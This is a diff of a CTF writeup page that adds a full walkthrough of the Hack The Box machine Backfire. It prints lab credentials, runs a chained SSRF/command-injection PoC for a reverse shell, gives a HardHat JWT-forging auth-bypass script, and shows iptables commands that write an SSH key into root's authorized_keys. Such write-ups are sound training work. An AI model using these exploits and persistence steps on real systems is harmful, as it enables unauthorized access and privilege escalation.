@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Backfire - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Backfire.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Backfire machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Backfire machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Backfire, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,224 @@
         <h1 class="writeup-title">Backfire</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">June 7, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Backfire" src="../images/Backfire/pwned.png" /></p>
-<p>Backfire is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Backfire retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Backfire/pwned.png" /></p>
+<p>Backfire was an engaging Linux box that showcased vulnerabilities in C2 frameworks and creative privilege escalation techniques.
+Initial reconnaissance revealed a Havoc C2 teamserver with exposed configuration files containing hardcoded credentials (ilya:CobaltStr1keSuckz! and sergej:1w4nt2sw1tch2h4rdh4tc2) and a patch file showing disabled TLS on the management port.</p>
+<p>I exploited a chained vulnerability combining SSRF and command injection to gain RCE on the Havoc teamserver.
+Using a public PoC, I established a websocket connection to the internal management port, authenticated as ilya, and executed a reverse shell.
+I then gained SSH access by injecting my public key into ilya's authorized_keys file to secure the user flag.</p>
+<p>A note in ilya's home directory revealed that sergej had installed HardHat C2 with default settings.
+After port forwarding, I exploited HardHat's authentication bypass vulnerability by crafting an admin JWT using the hardcoded secret, creating a new TeamLead user, and accessing the interactive terminal feature for command execution as sergej.
+Again, I established SSH persistence through key injection.</p>
+<p>For root escalation, I discovered sergej could run iptables and iptables-save as root.
+Using a creative technique, I exploited bash's $'\n' quoting mechanism to inject my SSH public key as a comment in an iptables rule, then used iptables-save to write the ruleset directly to /root/.ssh/authorized_keys, achieving full root access through a novel abuse of legitimate system utilities.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Backfire/nmap.png" /></p>
+<p>Nmap scan reveals a few ports. SSH on 22, a website on port 8000 and an unidentified service on port 5000.</p>
+<p>There are also 2 files to grab from the webpage, so I'll do that right away.</p>
+<div class="codehilite"><pre><span></span><code><span class="gh">#</span> havoc.yaotl
+
+Teamserver {
+    Host = &quot;127.0.0.1&quot;
+    Port = 40056
+
+    Build {
+        Compiler64 = &quot;data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc&quot;
+        Compiler86 = &quot;data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc&quot;
+        Nasm = &quot;/usr/bin/nasm&quot;
+    }
+}
+
+Operators {
+    user &quot;ilya&quot; {
+        Password = &quot;CobaltStr1keSuckz!&quot;
+    }
+
+    user &quot;sergej&quot; {
+        Password = &quot;1w4nt2sw1tch2h4rdh4tc2&quot;
+    }
+}
+
+Demon {
+    Sleep = 2
+    Jitter = 15
+
+    TrustXForwardedFor = false
+
+    Injection {
+        Spawn64 = &quot;C:\\Windows\\System32\\notepad.exe&quot;
+        Spawn32 = &quot;C:\\Windows\\SysWOW64\\notepad.exe&quot;
+    }
+}
+
+Listeners {
+    Http {
+        Name = &quot;Demon Listener&quot;
+        Hosts = [
+            &quot;backfire.htb&quot;
+        ]
+        HostBind = &quot;127.0.0.1&quot; 
+        PortBind = 8443
+        PortConn = 8443
+        HostRotation = &quot;round-robin&quot;
+        Secure = true
+    }
+}
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="c1"># Disable_tls.patch</span>
+
+<span class="n">Disable</span><span class="w"> </span><span class="n">TLS</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Websocket</span><span class="w"> </span><span class="n">management</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">40056</span><span class="p">,</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">prove</span><span class="w"> </span><span class="n">that</span>
+<span class="n">sergej</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">doing</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">work</span>
+<span class="n">Management</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="n">only</span><span class="w"> </span><span class="n">allows</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">connections</span><span class="w"> </span><span class="p">(</span><span class="n">we</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">forwarding</span><span class="p">)</span><span class="w"> </span><span class="n">so</span><span class="w"> </span>
+<span class="n">this</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">compromize</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">teamserver</span>
+
+<span class="n">diff</span><span class="w"> </span><span class="o">--</span><span class="n">git</span><span class="w"> </span><span class="n">a</span><span class="o">/</span><span class="n">client</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">Havoc</span><span class="o">/</span><span class="n">Connector</span><span class="o">.</span><span class="n">cc</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">client</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">Havoc</span><span class="o">/</span><span class="n">Connector</span><span class="o">.</span><span class="n">cc</span>
+<span class="n">index</span><span class="w"> </span><span class="n">abdf1b5</span><span class="o">..</span><span class="mi">6</span><span class="n">be76fb</span><span class="w"> </span><span class="mi">100644</span>
+<span class="o">---</span><span class="w"> </span><span class="n">a</span><span class="o">/</span><span class="n">client</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">Havoc</span><span class="o">/</span><span class="n">Connector</span><span class="o">.</span><span class="n">cc</span>
+<span class="o">+++</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">client</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">Havoc</span><span class="o">/</span><span class="n">Connector</span><span class="o">.</span><span class="n">cc</span>
+<span class="err">@@</span><span class="w"> </span><span class="o">-</span><span class="mi">8</span><span class="p">,</span><span class="mi">12</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="mi">11</span><span class="w"> </span><span class="err">@@</span><span class="w"> </span><span class="n">Connector</span><span class="p">::</span><span class="n">Connector</span><span class="p">(</span><span class="w"> </span><span class="n">Util</span><span class="p">::</span><span class="n">ConnectionInfo</span><span class="o">*</span><span class="w"> </span><span class="n">ConnectionInfo</span><span class="w"> </span><span class="p">)</span>
+<span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">Teamserver</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">ConnectionInfo</span><span class="p">;</span>
+<span class="w">     </span><span class="n">Socket</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">QWebSocket</span><span class="p">();</span>
+<span class="o">-</span><span class="w">    </span><span class="n">auto</span><span class="w"> </span><span class="n">Server</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;wss://&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Teamserver</span><span class="o">-&gt;</span><span class="n">Host</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="n">Teamserver</span><span class="o">-&gt;</span><span class="n">Port</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;/havoc/&quot;</span><span class="p">;</span>
+<span class="o">+</span><span class="w">    </span><span class="n">auto</span><span class="w"> </span><span class="n">Server</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;ws://&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Teamserver</span><span class="o">-&gt;</span><span class="n">Host</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="n">Teamserver</span><span class="o">-&gt;</span><span class="n">Port</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;/havoc/&quot;</span><span class="p">;</span>
+<span class="w">     </span><span class="n">auto</span><span class="w"> </span><span class="n">SslConf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Socket</span><span class="o">-&gt;</span><span class="n">sslConfiguration</span><span class="p">();</span>
+
+<span class="w">     </span><span class="o">/*</span><span class="w"> </span><span class="n">ignore</span><span class="w"> </span><span class="n">annoying</span><span class="w"> </span><span class="n">SSL</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="o">*/</span>
+<span class="w">     </span><span class="n">SslConf</span><span class="o">.</span><span class="n">setPeerVerifyMode</span><span class="p">(</span><span class="w"> </span><span class="n">QSslSocket</span><span class="p">::</span><span class="n">VerifyNone</span><span class="w"> </span><span class="p">);</span>
+<span class="o">-</span><span class="w">    </span><span class="n">Socket</span><span class="o">-&gt;</span><span class="n">setSslConfiguration</span><span class="p">(</span><span class="w"> </span><span class="n">SslConf</span><span class="w"> </span><span class="p">);</span>
+<span class="w">     </span><span class="n">Socket</span><span class="o">-&gt;</span><span class="n">ignoreSslErrors</span><span class="p">();</span>
+
+<span class="w">     </span><span class="n">QObject</span><span class="p">::</span><span class="n">connect</span><span class="p">(</span><span class="w"> </span><span class="n">Socket</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">QWebSocket</span><span class="p">::</span><span class="n">binaryMessageReceived</span><span class="p">,</span><span class="w"> </span><span class="n">this</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="o">&amp;</span><span class="p">](</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">QByteArray</span><span class="o">&amp;</span><span class="w"> </span><span class="n">Message</span><span class="w"> </span><span class="p">)</span>
+<span class="n">diff</span><span class="w"> </span><span class="o">--</span><span class="n">git</span><span class="w"> </span><span class="n">a</span><span class="o">/</span><span class="n">teamserver</span><span class="o">/</span><span class="n">cmd</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">teamserver</span><span class="o">.</span><span class="n">go</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">teamserver</span><span class="o">/</span><span class="n">cmd</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">teamserver</span><span class="o">.</span><span class="n">go</span>
+<span class="n">index</span><span class="w"> </span><span class="mi">9</span><span class="n">d1c21f</span><span class="o">..</span><span class="mi">59</span><span class="n">d350d</span><span class="w"> </span><span class="mi">100644</span>
+<span class="o">---</span><span class="w"> </span><span class="n">a</span><span class="o">/</span><span class="n">teamserver</span><span class="o">/</span><span class="n">cmd</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">teamserver</span><span class="o">.</span><span class="n">go</span>
+<span class="o">+++</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">teamserver</span><span class="o">/</span><span class="n">cmd</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">teamserver</span><span class="o">.</span><span class="n">go</span>
+<span class="err">@@</span><span class="w"> </span><span class="o">-</span><span class="mi">151</span><span class="p">,</span><span class="mi">7</span><span class="w"> </span><span class="o">+</span><span class="mi">151</span><span class="p">,</span><span class="mi">7</span><span class="w"> </span><span class="err">@@</span><span class="w"> </span><span class="k">func</span><span class="w"> </span><span class="p">(</span><span class="n">t</span><span class="w"> </span><span class="o">*</span><span class="n">Teamserver</span><span class="p">)</span><span class="w"> </span><span class="n">Start</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="p">}</span>
+
+<span class="w">                </span><span class="o">//</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">teamserver</span>
+<span class="o">-</span><span class="w">               </span><span class="k">if</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">t</span><span class="o">.</span><span class="n">Server</span><span class="o">.</span><span class="n">Engine</span><span class="o">.</span><span class="n">RunTLS</span><span class="p">(</span><span class="n">Host</span><span class="o">+</span><span class="s2">&quot;:&quot;</span><span class="o">+</span><span class="n">Port</span><span class="p">,</span><span class="w"> </span><span class="n">certPath</span><span class="p">,</span><span class="w"> </span><span class="n">keyPath</span><span class="p">);</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="o">+</span><span class="w">               </span><span class="k">if</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">t</span><span class="o">.</span><span class="n">Server</span><span class="o">.</span><span class="n">Engine</span><span class="o">.</span><span class="n">Run</span><span class="p">(</span><span class="n">Host</span><span class="o">+</span><span class="s2">&quot;:&quot;</span><span class="o">+</span><span class="n">Port</span><span class="p">);</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                        </span><span class="n">logger</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="s2">&quot;Failed to start websocket: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
+<span class="w">                </span><span class="p">}</span>
+</code></pre></div>
+
+<p>There are 2 sets of credentials in the first file, and the second file reveals that this havoc teamserver is not using TLS on a local port.</p>
+<h2>RCE via chained PoCs on Havoc.</h2>
+<p>Eventually, I found two PoCs related to Havoc.</p>
+<p><code>https://github.com/chebuya/Havoc-C2-SSRF-poc</code></p>
+<p><code>https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce</code></p>
+<p>And a third PoC that combines the previous two.</p>
+<p><code>https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE</code></p>
+<p>The main idea behind this PoC chain is to use SSRF to open a websocket connection to 127.0.0.1:40056, authenticate as ilya and then use the command injection to send back a reverse shell.</p>
+<p>The combined PoC requires a few small modifications which are commented nicely. Additionally, I'll change the command to a regular bash reverse shell.</p>
+<p><img alt="modif" src="../images/Backfire/modif.png" /></p>
+<p>I'll run the combined script.</p>
+<p><code>python havoc_rce.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056</code></p>
+<p><img alt="shell" src="../images/Backfire/shell.png" /></p>
+<p>The shell has been received succesfully.</p>
+<h2>Getting SSH access as ilya</h2>
+<p>I would like to gain SSH access, in order to quickly return if I were to get kicked off this bash shell. I can do that by injecting a public key into the <code>authorized_keys</code> of ilya.</p>
+<p>First, I want to generate a key. I'll do so using ssh-keygen.</p>
+<p>I'll copy the public key, and I'll paste it into the authorized_keys of ilya on the box.</p>
+<p><code>echo "key" &gt;&gt; ~/.ssh/authorized_keys</code></p>
+<p><img alt="keys" src="../images/Backfire/keys.png" /></p>
+<p>Now I should be able to ssh as ilya using my private key.</p>
+<p><img alt="user" src="../images/Backfire/user.png" /></p>
+<h1>Root flag</h1>
+<p>Besides the user flag, there is also a hardhat.txt note in ilya's home directory.</p>
+<p><code>Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
+I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go &gt; C#</code></p>
+<p>Since this note mentions hardhat, I did some research and found a few important things:</p>
+<ol>
+<li>Port 7096 is used by hardhat</li>
+<li><code>https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7</code></li>
+</ol>
+<p>The linked blog contains a few vulnerabilities. I'm going to use the second one.</p>
+<h2>HardHat auth bypass</h2>
+<p>I forwarded port 7096 and 5000(seen in the PoC) with ssh.</p>
+<p><code>ssh ilya@10.10.11.49 -i id_1 -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096</code></p>
+<p>I then went to https://127.0.0.1:7096, and was welcomed by the HardHat login screen.</p>
+<p><img alt="hardhat" src="../images/Backfire/hardhat.png" /></p>
+<p>This is where the exploit comes in. It'll allow me to create a new user with no authentication.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># @author Siam Thanat Hack Co., Ltd. (STH)</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">uuid</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+
+<span class="n">rhost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;127.0.0.1:5000&#39;</span>
+
+<span class="c1"># Craft Admin JWT</span>
+<span class="n">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;jtee43gt-6543-2iur-9422-83r5w27hgzaq&quot;</span>
+<span class="n">issuer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;hardhatc2.com&quot;</span>
+<span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span>
+
+<span class="n">expiration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="mi">28</span><span class="p">)</span>
+<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="s2">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HardHat_Admin&quot;</span><span class="p">,</span><span class="w">  </span>
+<span class="w">    </span><span class="s2">&quot;jti&quot;</span><span class="p">:</span><span class="w"> </span><span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()),</span>
+<span class="w">    </span><span class="s2">&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;iss&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">issuer</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;aud&quot;</span><span class="p">:</span><span class="w"> </span><span class="n">issuer</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;iat&quot;</span><span class="p">:</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="n">now</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()),</span>
+<span class="w">    </span><span class="s2">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="n">expiration</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()),</span>
+<span class="w">    </span><span class="s2">&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Administrator&quot;</span>
+<span class="p">}</span>
+
+<span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">secret</span><span class="p">,</span><span class="w"> </span><span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;HS256&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Generated JWT:&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+
+<span class="c1"># Use Admin JWT to create a new user &#39;sth_pentest&#39; as TeamLead</span>
+<span class="n">burp0_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">f</span><span class="s2">&quot;https://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">/Login/Register&quot;</span>
+<span class="n">burp0_headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span><span class="w"> </span><span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;application/json&quot;</span>
+<span class="p">}</span>
+<span class="n">burp0_json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;hexicon&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="s2">&quot;role&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TeamLead&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;hexicon&quot;</span>
+<span class="p">}</span>
+<span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span><span class="w"> </span><span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span><span class="w"> </span><span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span><span class="w"> </span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
+
+<p><img alt="exp" src="../images/Backfire/exp.png" /></p>
+<p>I should now be able to login with the credentials <code>hexicon | hexicon</code></p>
+<p><img alt="hardlog" src="../images/Backfire/hardlog.png" /></p>
+<h2>HardHat RCE</h2>
+<p>Looking back at the linked article, I can see a way to gain remote code execution on HardHat.</p>
+<p>After clicking the interact field, I can open a terminal and execute commands on the box.</p>
+<p><img alt="hardhatexec" src="../images/Backfire/hardhatexec.png" /></p>
+<p>Since its running as sergej, I added my key to his authorized_keys, just like I did earlier with ilya.</p>
+<p><img alt="ssh" src="../images/Backfire/ssh.png" /></p>
+<h2>Sergej to root</h2>
+<p><img alt="sudol" src="../images/Backfire/sudol.png" /></p>
+<p>Sergej can run both iptables and iptables-save as root. I can set rules with iptables, and save everything in my location of choice with iptables-save.</p>
+<p>I searched <code>iptables root escalation</code>, and quickly found an interesting article.</p>
+<p><code>https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/</code></p>
+<p>By using the $'' quoting with the comment, \n will be treated as a newline character and will push everything after itself onto a new line.</p>
+<p>Since I can save the ruleset everywhere I want, I'm going to use iptables to create a rule with a comment containing <code>\n&lt;KEY&gt;\n</code>, which should place the key on a separate line from everything.</p>
+<p>By saving the ruleset in <code>/root/.ssh/authorized_keys</code>, I will be able to ssh into the machine as root.</p>
+<p><code>sudo iptables -A INPUT -i lo -j ACCEPT  -m comment --comment $'\n&lt;KEY&gt;\n'</code></p>
+<p>Lets confirm whether the key is indeed on a separate line.</p>
+<p><code>sudo iptables -S</code></p>
+<p><img alt="separate" src="../images/Backfire/separate.png" /></p>
+<p>Everything worked correctly. I'll save the rules into root's authorized_keys dir.</p>
+<p><code>sudo iptables-save -f /root/.ssh/authorized_keys</code></p>
+<p>Lastly, I'll ssh into the box as root to finish the box.</p>
+<p><img alt="root" src="../images/Backfire/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
